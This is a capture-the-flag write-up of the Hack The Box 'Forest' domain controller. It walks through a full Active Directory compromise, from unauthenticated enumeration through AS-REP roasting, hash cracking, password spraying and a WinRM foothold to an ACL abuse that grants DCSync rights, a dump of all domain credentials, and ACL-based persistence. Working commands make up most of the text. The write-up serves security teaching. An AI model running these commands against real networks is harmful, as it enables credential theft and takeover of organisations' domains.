# FOREST – Active Directory Full Walkthrough

> ⚠️ **Disclaimer**
> This walkthrough was performed in a controlled lab environment with full authorization.
> All actions are for educational and defensive security purposes only.

---

## 🧭 Overview

* **Target**: FOREST.htb.local
* **OS**: Windows Server 2016 (Domain Controller)
* **Goal**: Domain compromise through Active Directory misconfigurations
* **Techniques used**:

  * Unauthenticated AD enumeration
  * AS-REP Roasting
  * Credential cracking
  * Privilege escalation via AD ACL abuse
  * DCSync
  * Domain persistence

---

## 1️⃣ Enumeration

### 🔍 Network & Service Discovery

```bash
nmap -sV -sC -Pn 10.129.32.62 -v
```

**Key findings**:

* Domain Controller exposed
* Kerberos (88), LDAP (389), SMB (445), WinRM (5985)
* Domain: `htb.local`
* Hostname: `FOREST`

This immediately identifies the target as an **Active Directory Domain Controller**, shifting the attack strategy toward **AD-specific attacks**.

---

## 2️⃣ RPC Enumeration (Unauthenticated)

```bash
rpcclient -U "" -N 10.129.32.62
```

### Enumerating Domain Users

```bash
enumdomusers
```

Users discovered:

* Administrator
* Guest
* krbtgt
* sebastien
* lucinda
* **svc-alfresco**
* andy
* mark
* santi

### Enumerating Domain Groups

```bash
enumdomgroups
```

Notable groups:

* Domain Admins
* Enterprise Admins
* Account Operators

### Password Policy

```bash
getdompwinfo
```

* Minimum length: 7
* No complexity enforced

➡️ Weak password policy + service accounts = **ideal AS-REP Roasting candidate**.

---

## 3️⃣ SMB Enumeration

```bash
crackmapexec smb 10.129.32.62 -u "" -p ""
```

Result:

* Guest authentication allowed
* Domain confirmed: `htb.local`

---

## 4️⃣ Kerberos AS-REP Roasting

### 🎯 Objective

Identify users without Kerberos pre-authentication enabled.

### Prepare User List

```bash
nano users.txt
```

```text
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

### Run AS-REP Roasting

```bash
impacket-GetNPUsers htb.local/ -dc-ip 10.129.32.62 -usersfile users.txt -format hashcat
```

Result:

* AS-REP hash obtained for **svc-alfresco**

---

## 5️⃣ Cracking the Hash

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

✅ Password recovered:

```text
svc-alfresco : s3rvice
```

---

## 6️⃣ Credential Validation & Access

### Password Spray

```bash
crackmapexec smb 10.129.32.62 -u users.txt -p "s3rvice" --continue-on-success
```

Only valid credential:

* `htb.local\svc-alfresco`

### Share Enumeration

```bash
crackmapexec smb 10.129.32.62 -u svc-alfresco -p s3rvice --shares
```

Readable shares:

* NETLOGON
* SYSVOL

---

## 7️⃣ Initial Foothold (WinRM)

```bash
evil-winrm -u svc-alfresco -p s3rvice -i 10.129.32.62
```

### Privilege Enumeration

```powershell
whoami /all
```

🔥 **Key Finding**:

```text
BUILTIN\Account Operators
```

### Why this matters

Account Operators can:

* Create users
* Modify non-admin users
* Reset passwords
* Manage some privileged groups

➡️ This group is often **underestimated** and enables **indirect domain compromise**.

---

## 8️⃣ Privilege Escalation – AD ACL Abuse

### Attack Path

```
Account Operators → Group Abuse → WriteDACL → DCSync
```

---

### Step 1 — Create a Controlled User

```powershell
net user svc-alfressco P@ssw0rd123 /add /domain
```

Verify:

```powershell
net user svc-alfressco /domain
```

---

### Step 2 — Add User to Privileged Group

```powershell
net group "Exchange Windows Permissions" svc-alfressco /add /domain
```

📌 **Why this group?**
It has **WriteDACL** permissions on the domain object.

---

### Step 3 — Grant DCSync Rights

From Kali / Parrot:

```bash
python3 /usr/local/bin/dacledit.py -action write -rights DCSync -principal svc-alfressco -target-dn "DC=htb,DC=local" htb.local/svc-alfressco:P@ssw0rd123
```

Output:

```text
[*] DACL backed up
[*] DACL modified successfully!
```

---

## 9️⃣ Full Domain Compromise (DCSync)

```bash
impacket-secretsdump htb.local/svc-alfressco:P@ssw0rd123@10.129.32.62
```

Recovered:

* Administrator NTLM hash
* krbtgt hash
* All domain credentials

🎉 **Domain Admin equivalent access achieved**.

---

## 🔁 Persistence

### Persistence Technique: DCSync ACL Abuse

**Why this is powerful**:

* No malware
* No scheduled tasks
* No admin group membership
* Survives password resets

As long as the ACL remains:

* NTDS.dit can be dumped
* Golden Tickets can be forged

### Proof of Persistence

```bash
impacket-secretsdump htb.local/svc-alfressco:P@ssw0rd123@10.129.32.62 -just-dc
```

---

## 🧹 Cleanup (After Proof)

```powershell
net user svc-alfressco /delete /domain
```

(Optional)

```powershell
net group "Exchange Windows Permissions" svc-alfressco /delete /domain
```

⚠️ **Note**: If the ACL is not reverted, persistence still exists.

---

## 🛡️ Defensive Takeaways

* Disable anonymous RPC enumeration
* Enforce Kerberos pre-authentication
* Monitor AS-REP roasting
* Restrict Account Operators
* Audit domain ACLs regularly

---

## 🏁 Conclusion

This lab demonstrates how **misconfigured Active Directory permissions**, not exploits, can lead to **full domain compromise and persistence**.
